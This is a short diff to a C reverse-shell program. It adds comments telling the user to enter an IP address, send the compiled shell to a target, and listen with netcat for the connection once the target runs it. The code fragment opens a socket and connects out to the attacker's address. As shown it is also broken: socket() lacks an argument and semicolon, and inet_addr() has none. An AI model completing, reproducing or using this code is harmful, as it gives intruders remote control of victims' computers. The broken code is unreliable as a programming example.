@@ -14,7 +14,9 @@ int main(void) {
     sockt = socket(AF_INET, SOCK_STREAM)
     revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr(); //enter your target ip address
+    revsockaddr.sin_addr.s_addr = inet_addr(); //enter your target ip address to create a reverse shell
+    //send the created reverse shell to your target after your target opened you will get a reverse connection
+    //use netcat or any other tool to listen on port
 
     connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
